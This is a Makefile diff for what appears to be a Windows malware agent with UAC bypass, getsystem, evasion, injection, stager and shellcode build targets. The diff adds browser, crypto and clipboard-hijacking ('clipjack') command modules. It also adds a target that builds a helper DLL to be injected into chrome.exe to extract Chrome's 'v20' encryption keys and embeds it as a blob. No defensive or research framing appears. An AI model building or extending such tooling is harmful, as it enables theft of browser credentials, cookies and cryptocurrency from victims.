@@ -88,6 +88,9 @@ SRC_SA  = src/main.c                 \
           src/commands/uac.c         \
           src/commands/getsystem.c   \
           src/commands/lpe_check.c   \
+          src/commands/browser.c     \
+          src/commands/crypto.c      \
+          src/commands/clipjack.c    \
           src/channels/smb.c         \
           src/evasion/evasion.c      \
           src/inject/inject.c        \
@@ -121,6 +124,9 @@ SRC_LEAN = src/main.c                    \
            src/commands/uac.c            \
            src/commands/getsystem.c      \
            src/commands/lpe_check.c      \
+           src/commands/browser.c        \
+           src/commands/crypto.c         \
+           src/commands/clipjack.c       \
            src/channels/smb.c            \
            src/evasion/evasion.c         \
            src/inject/inject_stub.c      \
@@ -159,6 +165,9 @@ SRC = src/main.c                 \
       src/commands/uac.c         \
       src/commands/getsystem.c   \
       src/commands/lpe_check.c   \
+      src/commands/browser.c     \
+      src/commands/crypto.c      \
+      src/commands/clipjack.c    \
       src/channels/smb.c         \
       src/evasion/evasion.c      \
       src/inject/inject.c        \
@@ -271,7 +280,7 @@ config:
 	$(PYTHON) tools/obfuscate.py
 	$(PYTHON) tools/gen_evs_strings.py
 
-$(TARGET): $(SRC) $(RES_OBJ)
+$(TARGET): $(SRC) $(RES_OBJ) include/agent_config.h
 	$(CC) $(CFLAGS) $(INCLUDE) $(SRC) $(RES_OBJ) $(LIBPATH) $(LIBS) $(LDFLAGS) -o $(TARGET)
 	$(STRIP) --strip-all $(TARGET)
 	$(OBJCOPY) --strip-debug $(TARGET)
@@ -287,6 +296,16 @@ strip: $(TARGET)
 	$(STRIP) --strip-all $(TARGET)
 	$(OBJCOPY) --strip-debug $(TARGET)
 	@echo "[ok] stripped"
+
+# chrome-helper: build helper DLL injected into chrome.exe for v20 key extraction
+# Requires xxd (from MSYS2: pacman -S vim) to generate the blob header.
+chrome-helper:
+	$(CC) -O2 -shared -DNDEBUG -DWIN32_LEAN_AND_MEAN \
+	    $(INCLUDE) src/helpers/chrome_key_helper.c \
+	    -Wl,-Bstatic -lbcrypt -lkernel32 -static-libgcc \
+	    -o $(BUILDDIR)/chrome_key_helper.dll
+	$(PYTHON) tools/bin2h.py $(BUILDDIR)/chrome_key_helper.dll chrome_key_helper_dll > include/chrome_key_helper_blob.h
+	@echo "[ok] chrome_key_helper.dll + include/chrome_key_helper_blob.h"
 
 relay:
 	$(CC) -O2 -Wall -DNDEBUG -DWIN32_LEAN_AND_MEAN \
@@ -312,4 +331,4 @@ else
 	rm -f $(BUILDDIR)/agent.exe $(BUILDDIR)/agent_res.o
 endif
 
-.PHONY: all standalone lean build-only debug stager stager-config stager-only shellcode-only reflective-dll-only bundle strip relay clean
+.PHONY: all standalone lean build-only debug stager stager-config stager-only shellcode-only reflective-dll-only bundle strip relay chrome-helper clean
